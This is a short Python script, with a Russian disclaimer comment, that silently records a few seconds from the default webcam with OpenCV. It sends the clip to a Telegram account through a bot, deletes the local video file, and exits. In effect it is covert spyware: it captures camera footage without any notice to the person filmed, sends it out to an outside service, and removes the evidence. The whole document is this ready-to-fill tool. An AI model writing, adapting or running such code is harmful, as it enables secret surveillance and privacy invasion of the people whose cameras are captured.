#Дисклеймер: не будь мразью, не используй его для похищения чего-либо
import cv2, telebot, os
from time import sleep
from telebot import types
from threading import Thread
bot = telebot.TeleBot('ваш токен')
gg = 1
def g():
    global gg
    sleep(2.5)
    gg = 0
cap = cv2.VideoCapture(0)
codec = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter('g.avi',codec, 30.0, (640,480))
while gg == 1:
    th = Thread(target=g)
    th.start()
    ret, img = cap.read()
    out.write(img)
    cv2.waitKey(1)
cap.release()
out.release()
img = open('g.avi', 'rb')
bot.send_video('ваш id в telegram', img, None, 'Видосик')
img.close()
os.remove(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'g.avi'))
raise SystemExit(1)
